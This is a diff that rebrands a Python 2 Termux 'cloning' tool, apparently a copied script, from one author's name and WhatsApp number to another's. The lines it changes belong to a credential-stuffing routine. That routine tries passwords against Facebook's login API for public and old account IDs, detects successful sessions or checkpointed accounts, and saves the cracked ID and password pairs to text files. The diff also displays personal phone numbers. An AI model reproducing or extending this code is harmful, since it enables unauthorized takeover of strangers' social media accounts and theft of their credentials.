@@ -785,32 +785,33 @@ logo = """
 
 \033[1;96m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-d88888D  .d8b.  d8888b.  .d8b.         
-YP  d8' d8' `8b 88  `8D d8' `8b        
-   d8'  88ooo88 88oobY' 88ooo88        
-  d8'   88~~~88 88`8b   88~~~88 C8888D 
- d8' db 88   88 88 `88. 88   88        
-d88888P YP   YP 88   YD YP   YP
-              HATERS DONT FEEEL IM QUEEN
+_ _    _ _   _          _____ _____  
+     | | |  | | \ | |   /\   |_   _|  __ \ 
+     | | |  | |  \| |  /  \    | | | |  | |
+ _   | | |  | | . ` | / /\ \   | | | |  | |
+| |__| | |__| | |\  |/ ____ \ _| |_| |__| |
+ \____/ \____/|_| \_/_/    \_\_____|_____/ 
+                                           
+              EVERY THING IS POSSIBLE NOTHING IS IMPOSSIBLE
 
-────────🔹          ZARA-NOOR        🔹────────
+────────🔹          HAZRAT-JUNAID        🔹────────
 
                                                    
 
-\033[1;93m Author: ZARA-NOOR (ZARA TERMUX QUEEN)
+\033[1;93m Author: HAZRAT-JUNAID (KiNg Of TeRmuX)
 
 
-\033[1;93m WhatsApp: +923410003464
+\033[1;93m WhatsApp: +923499356168
 
 
-\033[1;93m YOUTUBE : TECHNICAL QUEEN 
+\033[1;93m YOUTUBE : KiNg Of TeRmuX
 
 
-\033[1;96m Janii  WELCOME TO MY WORLD
+\033[1;96m Janii  WELCOME TO KiNg WORLD
 
 \033[0;95m═══════════════════════════════════════════
 
-\033[0;94m>>[\033[0;96mOWNER   :\033[0;93mZARA-NOOR     
+\033[0;94m>>[\033[0;96mOWNER   :\033[0;93mHAZRAT-JUNAID     
 
 \033[0;93m>>[\033[0;96mUSER:\033[0;92      PAKISTAN ZINDABAD 
 
@@ -842,7 +843,7 @@ class Main:
 
 		print(" \033[0;93m[2] Crack from Public Id  ~[login]")
 
-		print(" [3] Cloning pubg account contact owner wp +923410003464")
+		print(" [3] Cloning pubg account contact owner wp +923499356168")
 
 		print(" \033[0;93m[4] Cloning Old Idz 2004-10 \033[0;93m~[No login]")
 
@@ -862,7 +863,7 @@ class Main:
 
 		if Mrdevil in ["3", "03"]:
 
-			os.system("python2 ZARA-NOOR.py")
+			os.system("python2 Junaid.py")
 
 		if Mrdevil in ["4", "04"]:
 
@@ -1716,23 +1717,23 @@ class Main:
 
 			if "session_key" in response.text and "EAAA" in response.text:
 
-				print("\r \033[0;92m[HACKER-Ok] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[JUNAID-Ok] %s | %s\033[0;97m         "%(uid, pw))
 
 				print ("\r \033[0;92m Congrats ")
 
 				self.ok.append("%s|%s"%(uid, pw))
 
-				open("2009HACKER_OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009JUNAID_OK.txt","a").write(" %s|%s\n"%(uid, pw))
 
 				break
 
 			elif "www.facebook.com" in response.json()["error_msg"]:
 
-				print("\r \033[0;92m[HACKER-OK] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[JUNAID-OK] %s | %s\033[0;97m         "%(uid, pw))
 
 				self.cp.append("%s|%s"%(uid, pw))
 
-				open("2009HACKER-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009JUNAID-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 
 				break
 
@@ -2584,17 +2585,17 @@ class Main:
 
 				self.ok.append("%s|%s"%(uid, pw))
 
-				open("2009HACKER-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009JUNAID-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 
 				break
 
 			elif "www.facebook.com" in response.json()["error_msg"]:
 
-				print("\r \033[0;93m[HACKER-OK] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;93m[JUNAID-OK] %s | %s\033[0;97m         "%(uid, pw))
 
 				self.cp.append("%s|%s"%(uid, pw))
 
-				open("2009HACKER-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009JUNAID-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 
 				break
 
